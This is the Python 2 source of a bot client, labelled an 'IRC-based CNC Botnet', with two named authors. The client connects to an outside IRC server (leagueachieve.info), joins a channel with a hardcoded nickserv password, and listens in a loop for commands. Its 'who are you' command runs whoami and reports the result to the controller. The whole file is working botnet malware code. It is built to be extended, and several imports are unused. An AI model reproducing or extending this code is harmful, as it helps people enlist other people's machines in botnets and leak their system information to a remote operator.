#!/usr/bin/python
#IRC-based CNC Botnet
#Authors: Luke Matarazzo and Jackson Sadowski
#Blizzo

import socket
import ftplib
import urllib2
import urllib
import sys
import ctypes
import random
import time
import platform
import os
import subprocess as sub
from random import randint

def genNick():
	flavor = execute('uname')
	rannum = str(randint(000, 999))
	nick = str(flavor) + str(rannum)
	return str(nick)

def execute(cmd):
	p = sub.Popen(cmd,stdout=sub.PIPE,stderr=sub.PIPE)
	output, errors = p.communicate()
	return output.strip('\n');

#IRC Settings
admins = ["king", "samorizu", "blackbear", "bigshebang"]
server = "leagueachieve.info"
channel = "#lobby"
botnick = genNick()

print botnick

#All of the possible functions that the botnet is capable of
def iAmHere(): #send back to IRC server that you are here
	irc.send('PRIVMSG ' + channel + " :Yes I am here" + '\r\n')

def iAmThis():
	cmd  = execute("whoami")
	irc.send('PRIVMSG ' + channel + " :" + cmd + '\r\n')

def iAmGood(): #send back to IRC server that you are good
	irc.send('PRIVMSG ' + channel + " :I am good. And you?" + '\r\n')


#function that handles multiple-line output
#def multipleLines():






#dictionary of functions
commands = {
	"are you there" : iAmHere,
	"how are you" : iAmGood,
	"who are you" : iAmThis
}

#function which parses the command and determine how to handle it
def parseCommand(command):
	print "given '%s'" % command
	arg = "PRIVMSG"
	if (arg in command):
		tempCommand = command[command.index(arg):]
		command = tempCommand[(tempCommand.index(':') + 1):].strip().lower()
		
		print "Recieved %s from the CNC" % command
		if command in commands.keys():
			commands[command]()
			print "function called"
		else:
			print "command '%s' not defined" % command


#Connecting to the IRC Server
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
print "connecting to: "+server
irc.connect((server, 6667)) #connects to the server
irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :This is a fun bot!\n") #user authentication
irc.send("NICK "+ botnick +"\n") #sets nick

temp=irc.recv(4096) #get response to setting nick
counter = 2
while "nickname already in use" in temp.lower():
	irc.send("NICK " + botnick + "-" + str(counter) + "\n") #sets nick
	temp=irc.recv(4096) #get response to setting nick
	counter += 1

irc.send("PRIVMSG nickserv :iNOOPE\r\n") #auth
irc.send("JOIN "+ channel +"\n") #join the channel

#infinite loop to listen for messages aka commands
while 1:
	text=irc.recv(4096)  #receive up to 4096 bytes
	lines = text.split("\n") #split commands based on new lines

	#The two lines below are required by the IRC RFC, if you remove them the bot will time out.
	if text.find('PING') != -1: #check if 'PING' is found
		irc.send('PONG ' + text.split() [1] + '\r\n') #returns 'PONG' back to the server to prevent pinging out

	parseCommand(text) #call function to parse commands
